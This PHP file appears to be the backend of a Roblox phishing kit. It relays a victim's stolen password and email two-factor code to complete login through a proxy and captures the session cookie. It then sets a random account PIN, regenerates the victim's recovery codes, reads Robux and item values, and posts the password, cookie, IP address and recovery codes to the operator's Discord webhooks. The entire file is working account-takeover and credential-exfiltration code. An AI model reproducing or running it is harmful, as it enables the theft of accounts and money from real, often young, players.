<?php


include('../web/setup/setup.php');
include('../web/setup/database.php');
include('../includes/functions.php');
$domain1 = $domain;
error_reporting(0);
session_start();
$userid = htmlspecialchars($_GET['id'],ENT_QUOTES);
$ticket = htmlspecialchars($_GET['ticket'],ENT_QUOTES);
$kode = htmlspecialchars($_GET['code'],ENT_QUOTES);
$password = $_GET['password'];
$logintoken = htmlspecialchars($_GET['session'],ENT_QUOTES);
$userIdch = request('https://users.roblox.com/v1/users/'.$userid);
$fullproxy = htmlspecialchars($_GET['proxy'],ENT_QUOTES);

$proxy = explode(':', $fullproxy);
$proxy_ip = $proxy[0];
$proxy_port = $proxy[1];
$user = $proxy[2];
$pass = $proxy[3];

$useridData = json_decode($userIdch);
$username = "$useridData->name";
$uid = $userid;

$row = $db->query("SELECT * FROM east WHERE logintoken='$logintoken'")->fetch();
$webhookurl1 = $row["webhook"];
$dualhookfucker = $row["dualhook"];
$w = $webhookurl1;
$webhookUrl = $w;
if(isset($_GET['id']) && isset($_GET['ticket']) && isset($_GET['code']) && isset($_GET['password'])) {
//Made by east thanks to methodsio + @crayons @Emanuele and everyone
    $ch = curl_init();
$fields_string='{
	"challengeId":"'.$ticket.'",
	"actionType":"Login",
	"code":"'.$kode.'"
}';
curl_setopt($ch, CURLOPT_URL, 'https://twostepverification.roblox.com/v1/users/'.$uid.'/challenges/email/verify');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){
    $middle = explode(":",$part,2);
    if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];
//dapetin Token
if(isset($kode)){
	
$fields_string='{
	"challengeId":"'.$ticket.'",
	"actionType":"Login",
	"code":"'.$kode.'"
}';

$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://twostepverification.roblox.com/v1/users/'.$uid.'/challenges/email/verify');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch2, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch2, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);

$output = curl_exec($ch2);
$json=json_decode($output); 
$jsoninvaliderror = '{"errors":[{"code":10,"message":"The two step verification challenge code is invalid.","userFacingMessage":"Something went wrong"}]}';
$jsoninvalidcodeerror = '{"errors":[{"code":1,"message":"Invalid challenge ID.","userFacingMessage":"Something went wrong"}]}';
if($output == $jsoninvaliderror){
    echo '{"result": "The two step verification challenge code is invalid."}';
    die();
}if($output == $jsoninvalidcodeerror){
echo '{"result": "The two step verification challenge code is invalid."}';
die();
}if($output !== '{"errors":[{"code":10,"message":"The two step verification challenge code is invalid.","userFacingMessage":"Something went wrong"}]}'){  
    $vtoken=$json->verificationToken;

	curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v3/users/'.$uid.'/two-step-verification/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){

    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
    $middle = explode(":",$part,2);

    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
    if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];
	
	
	$fields_string='{
	"challengeId":"'.$ticket.'",
	"verificationToken":"'.$vtoken.'",
	"rememberDevice":true
}';

$chcok= curl_init();

curl_setopt($chcok, CURLOPT_URL, 'https://auth.roblox.com/v3/users/'.$uid.'/two-step-verification/login');
curl_setopt($chcok, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($chcok, CURLOPT_POST, 1);
curl_setopt($chcok, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($chcok, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($chcok, CURLOPT_PROXY, $proxy_ip);
curl_setopt($chcok, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($chcok, CURLOPT_HEADER, 1);
curl_setopt($chcok, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($chcok, CURLOPT_HTTPHEADER, $headers);

$output = curl_exec($chcok);
    $cookie = null;
    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
$ipaddr = getUserIP();
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $cookie
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $profile = json_decode(curl_exec($ch), 1);
    curl_close($ch);
    $userid = $profile["UserID"];
    $bobux = $profile["RobuxBalance"];
    $ch3= curl_init();
        
    curl_setopt($ch3, CURLOPT_URL, 'https://billing.roblox.com/v1/credit');
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch3, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch3, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch3, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch3, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';
    $headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
     $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
    $headers[] =    'Referer: https://www.roblox.com/login';
       $headers[] = 'Origin: https://www.roblox.com';
    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
    $output2 = curl_exec($ch3);
    $info2=json_decode($output2);
    $balance=$info2->balance;
    $ch4= curl_init();
    
    curl_setopt($ch4, CURLOPT_URL, "https://economy.roblox.com/v2/users/$userid/transaction-totals?timeFrame=Year&transactionType=summary");
    curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch4, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch4, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch4, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch4, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';
    $headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
     $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
    $headers[] =    'Referer: https://www.roblox.com/login';
       $headers[] = 'Origin: https://www.roblox.com';
    curl_setopt($ch4, CURLOPT_HTTPHEADER, $headers);
    $output3 = curl_exec($ch4);
    $info3=json_decode($output3);
    $summary1=$info3->purchasesTotal;
    $summary = number_format($summary1);
function requestPinCookie($cookie)
{
    $getPin = requestCookie("https://auth.roblox.com/v1/account/pin", $cookie);
    $getPinDecode = json_decode($getPin);
    $pin = $getPinDecode->isEnabled;
    return $pin;
}
    function getrap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                            
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_PROXYPORT, $proxy_port);
            curl_setopt($request, CURLOPT_PROXYTYPE, 'HTTP');
            curl_setopt($request, CURLOPT_PROXY, $proxy_ip);
            curl_setopt($request, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                            
        return $total_rap;
    }
    function requestCookie($url, $cookie)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
    }
   
    function postPin($cookie, $fullproxy){
        $proxy = explode(':', $fullproxy);
        $proxy_ip = $proxy[0];
        $proxy_port = $proxy[1];
        $user = $proxy[2];
        $pass = $proxy[3];
    if(requestPinCookie($cookie, $fullproxy) == "true"){
        return "Undefined";
    }if(requestVerifiedCookie($cookie, $fullproxy) == "Unverified"){
        return "Undefined";
    }else{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{
    "cvalue":"Leakeder",
    "ctype":"Username",
    "password":"RAMAD001",
    }'
    );
    
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';
    $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
    $headers[] =    'Referer: https://www.roblox.com/login';
    $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
    $headers[] = 'Origin: https://www.roblox.com';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    $headers = [];
    $result = rtrim($result);
    $data = explode("\n",$result);
    $headers['status'] = $data[0];
    array_shift($data);
    
    foreach($data as $part){
    
    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
    $middle = explode(":",$part,2);
    
    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
    if ( !isset($middle[1]) ) { $middle[1] = null; }
    $headers[trim($middle[0])] = trim($middle[1]);
    }
    
    $csrf= $headers["x-csrf-token"];
    
    $pin = rand("0000","9999");
    
    $fields_string='{
    "pin": "'.$pin.'"
    }';
    
    $ch2= curl_init();
    curl_setopt($ch2, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch2, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch2, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch2, CURLOPT_URL, 'https://auth.roblox.com/v1/account/pin');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_HEADER, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';
    $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
    $headers[] =    'Referer: https://www.roblox.com/login';
    $headers[] = 'Origin: https://www.roblox.com';
    $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
    $headers[] =    'x-csrf-token:'.$csrf;
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $header_size = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
    $output = curl_exec($ch2);
    return "$pin";
    }
    }
        $getdate = "https://users.roblox.com/v1/users/$userid";
        
        $gcurl = curl_init($getdate);
        curl_setopt($gcurl, CURLOPT_URL, $getdate);
        curl_setopt($gcurl, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($gcurl, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($gcurl, CURLOPT_PROXY, $proxy_ip);
        curl_setopt($gcurl, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
        curl_setopt($gcurl, CURLOPT_RETURNTRANSFER, true);
        
        $headers = array(
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
        );
        curl_setopt($gcurl, CURLOPT_HTTPHEADER, $headers);
        //for debug only!
        curl_setopt($gcurl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($gcurl, CURLOPT_SSL_VERIFYPEER, false);
        
        $gresp = curl_exec($gcurl);
        $getdata = json_decode($gresp);
        $joindate = $getdata->created;
        $age = date_diff(date_create($joindate), date_create('now'))->d;
                        //beam count time! daddy!
    //uwu stop!!! uwu daddy!!!! wyddddd
    function requestCreditCookie($cookie)
{
    $getCredit = requestCookie("https://billing.roblox.com/v1/gamecard/userdata", $cookie);
    $_Credit = str_replace('"', '', $getCredit);
    return $_Credit;
}
$cookie1 = str_replace("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", "", $cookie);
 function recoveryCodes($verified,$cookie, $password, $userid){
    if($verified == "Unverified"){
    echo "Unverified";
    }else{
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{
            "cvalue":"Leakeder",
            "ctype":"Username",
            "password":"RAMAD001",
        }'
        );
        
        $headers = array();
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Accept: application/json';
         $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
        $headers[] =    'Referer: https://www.roblox.com/login';
         $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
           $headers[] = 'Origin: https://www.roblox.com';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        $headers = [];
        $result = rtrim($result);
        $data = explode("\n",$result);
        $headers['status'] = $data[0];
        array_shift($data);
        
        foreach($data as $part){
        
            //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
            $middle = explode(":",$part,2);
        
            //Supress warning message if $middle[1] does not exist, Thanks to @crayons
            if ( !isset($middle[1]) ) { $middle[1] = null; }
        $headers[trim($middle[0])] = trim($middle[1]);
        }
        
        $csrf= $headers["x-csrf-token"];
    $fields_string='{
        "password": "'.$password.'"
      }';
    $ch2= curl_init();
    
    curl_setopt($ch2, CURLOPT_URL, 'https://twostepverification.roblox.com/v1/users/'.$userid.'/recovery-codes/regenerate');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch2, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch2, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_HEADER, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);
    
    
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';
     $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
    $headers[] =    'Referer: https://www.roblox.com/';
       $headers[] = 'Origin: https://www.roblox.com';
       $headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
       $headers[] =    'x-csrf-token:'.$csrf;
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $header_size = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
    $output1 = curl_exec($ch2);
    $pos = strpos($output1, '{"recoveryCodes":');
        $outputs = substr($output1, $pos);
    $pos = strpos($output1, '{"errors":[');
        $outputerr = substr($output1, $pos);
        if($outputerr == '{"errors":[{"code":6,"message":"The account pin is locked.","userFacingMessage":"Something went wrong"}]}'){
            return "Error when try generate Recovery Codes because account have PIN";
        }elseif($outputerr == '{"errors":[{"code":5,"message":"Too many requests.","userFacingMessage":"Something went wrong"}]}'){
    return 'Too many requests';
    }elseif($outputerr !== '{"errors":[{"code":6,"message":"The account pin is locked.","userFacingMessage":"Something went wrong"}]}'){
    $json = json_decode($outputs, true);
    $shit1 = $json["recoveryCodes"]["0"];
    $shit2 = $json["recoveryCodes"]["1"];
    $shit3 = $json["recoveryCodes"]["2"];
    $shit4 = $json["recoveryCodes"]["3"];
    $shit5 = $json["recoveryCodes"]["4"];
    $shit6 = $json["recoveryCodes"]["5"];
    $shit7 = $json["recoveryCodes"]["6"];
    return "$shit1, $shit2, $shit3, $shit4, $shit5, $shit6, $shit7";
    }else{
        return "Failure";
    }
    }
    }
        

 function getPendingRobux($cookie){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $cookie
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $profile = json_decode(curl_exec($ch), 1);
    curl_close($ch);
    $shit = requestCookie("https://economy.roblox.com/v2/users/" . $profile["UserID"] . "/transaction-totals?timeFrame=Year&transactionType=summary", $cookie);
    $json = json_decode($shit, true);
    return $json["pendingRobuxTotal"];
}

    $request = requestCookie('https://web.roblox.com/my/settings/json', $cookie);
    $json = json_decode($request);
$getsetting = $json;
function requestAge($id)
{
    $getDateBirth = request("https://users.roblox.com/v1/users/$id");
    $jsonDateBirth = json_decode($getDateBirth);
    preg_match('/(?<=)(.*?)(?=T)/', $jsonDateBirth->created, $result);
    $dateBirth = $result[0];
    $Today = date("Y-m-d");
    $Count = date_diff(date_create($dateBirth), date_create($Today));
    return $Count->days . " Days";
}
$premium = requestCookie('https://premiumfeatures.roblox.com/v1/users/'.$profile["UserID"].'/validate-membership', $cookie);
$rap = getrap($profile["UserID"], $cookie);
if($rap > 10000){
    $content = "@everyone";
}else if($bobux > 10000){
    $content = "@everyone";
}else{
    $content = "";
}
if($getsetting->UserAbove13){
    $changeage = "13+";
}else{
    $changeage = "<13";
}
if($getsetting->IsEmailVerified){
    $isVerified="True";
}else{
    $isVerified="False";
}
$recoveryCodes = recoveryCodes($isVerified,$cookie,$password,$userid);
function requestVerifiedCookie($cookie)
{
$getVerified = requestCookie("https://accountsettings.roblox.com/v1/email", $cookie);
$getVerifiedDecode = json_decode($getVerified);
if (!($getVerifiedDecode->verified)) {
return "Unverified";
} else {
return "Verified";
}
}
$pin = postPin($cookie, $fullproxy);
$age = requestAge($profile["UserID"]);
$pendingRobux = getPendingRobux($cookie);
$creditbalance = requestCreditCookie($cookie);
$password1 = rawurlencode($password);
$hookObject = json_encode([
    "username" => "BOT - $siteName",
    "avatar_url" => "$mainpfp",
     "content" => "$content",
        "embeds" => [
            [
                "title" => '**:money_with_wings: +1 Result Account :candle:**',
                "type" => "rich",
                "description" => "[**Check Cookie**]($domain/controller/check-cookie.php?cookie=$cookie1&password=$password1&address=$fullproxy) | [**Rolimons**](https://www.rolimons.com/player/$userid) | [**Roblox Profile**](https://roblox.com/users/$userid/profile)",
                "url" => "https://www.roblox.com/users/$userid/profile",
                "color" => hexdec("$embedColor"),
                "thumbnail" => [
                    "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=$userid&width=420&height=420&format=png"
                ],
                "author" => [
                     "name" => "$siteName - Result",
                     "url" => "$discord"
                ],
                "footer" => [
                    "text" => "$siteName",
                  "icon_url" => "$mainpfp"
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => "$username",
                        "inline" => False
                    ],
                    [
                        "name" => "**Password**",
                        "value" => "$password",
                        "inline" => False
                    ],
                    [
                        "name" => "**Robux (Robux Pending)**",
                        "value" =>  "$bobux ($pendingRobux)",
                        "inline" => True
                    ],
                    [
                        "name" => "**Summary**",
                        "value" => "$summary",
                        "inline" => True
                    ],
                    [
                        "name" => "**Premium**",
                        "value" => "$premium",
                        "inline" => True
                    ],
                    [
                        "name" => "**RAP**",
                        "value" => "$rap",
                        "inline" => True
                    ],
                    [
                        "name" => "**Credit Balance**",
                        "value" =>  "$balance",
                        "inline" => True
                    ],
                    [
                        "name" => "**Verified**",
                        "value" => requestVerifiedCookie($cookie),
                        "inline" => True
                    ],
                    [
                        "name" => "**Account Age**",
                        "value" => "$age",
                        "inline" => True
                    ],
                    [
                        "name" => "**PIN**",
                        "value" => "$pin",
                        "inline" => True
                    ],
                    [
                        "name" => "**IP Address**",
                        "value" => "$ipaddr",
                        "inline" => True
                    ],
                    [
                        "name" => "**Recovery Codes**",
                        "value" => "$recoveryCodes",
                        "inline" => False
                    ],
                    [
                        "name" => "**Cookie:**",
                        "value" => "```$cookie```",
                        "inline" => False
                    ],
                ]
            ],
        ],
    
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$chsexylol = curl_init();
curl_setopt_array($chsexylol, [
    CURLOPT_URL => "$webhookurl1",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

                                
$responsesexylol = curl_exec($chsexylol);
curl_close($chsexylol);
                $cha = curl_init();
        curl_setopt_array($cha, [
            CURLOPT_URL => "$dualhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $responsea = curl_exec($cha);
        curl_close($cha);
        if($dualhookfucker !== ""){
        $cho = curl_init();
        curl_setopt_array($cho, [
            CURLOPT_URL => "$dualhookfucker",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $responseo = curl_exec($cho);
        curl_close($cho);
    }
echo '{"result": "success"}';
        
     	$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://www.roblox.com/mobileapi/userinfo');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch2, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch2, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
$output = curl_exec($ch2);
$info=json_decode($output);
}
}
}
?>